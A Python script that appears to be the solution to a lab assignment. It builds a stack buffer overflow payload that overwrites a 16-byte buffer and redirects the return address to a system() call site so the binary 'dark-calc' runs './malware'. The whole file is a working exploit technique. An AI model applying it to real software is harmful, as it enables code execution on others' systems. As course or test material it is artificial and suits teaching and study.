#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

Overflow the 16-byte `expression` buffer in input():
  offset 0..15  : command string "./malware" (strcpy copies it into the
                  global command_buf at 0x6030d0)
  offset 16..23 : saved rbp
  offset 24..31 : return address -> 0x401a6b in eval(), i.e.
                  "mov $0x6030d0,%edi ; call system", so system() runs
                  command_buf = "./malware".
The trailing newline terminates gets(); its NUL lands at offset 32 and
does not touch the return address.
"""
import struct
import sys

SYSTEM_CALL_SITE = 0x401A6B

payload = b"./malware\x00" + b"A" * 6
payload += b"B" * 8
payload += struct.pack("<Q", SYSTEM_CALL_SITE)
payload += b"\n"

sys.stdout.buffer.write(payload)
